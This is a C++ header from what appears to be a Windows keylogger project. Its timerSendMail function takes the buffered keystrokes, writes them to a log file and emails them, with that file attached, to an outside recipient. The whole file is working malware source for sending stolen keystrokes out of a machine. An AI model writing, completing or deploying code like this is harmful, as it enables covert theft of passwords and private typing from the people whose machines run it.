#ifndef _KEYBOARDHOOK_H_
#define _KEYBOARDHOOK_H_

#include <iostream>
#include <fstream>
#include <windows.h>
#include "keyConstants.h"
#include "timer.h"
#include "sendEmail.h"

std::string keylog = "";

void timerSendMail()
{
	if (keylog.empty()) { return; }
		
	std::string last_file = inputOutput::writeLog(keylog);

	if (last_file.empty())
	{
		Helper::writeLogFile("File creation was not succesfull. Keylog '" + keylog + "'");
		return;
	}

	int x = Mail::sendMail("Log [" + last_file + "]",
		"Hi :)\nThe file has been attached to this mail :)\n"
		"For testing, enjoy:\n" + keylog,
		inputOutput::getOurPath(true) + last_file);

	if (x != 7)
	{
		Helper::writeLogFile("Mail was not send! Error code: " + Helper::toString(x));
	}
	else
	{
		keylog = "";
	}
}

#endif // _KEYBOARDHOOK_H_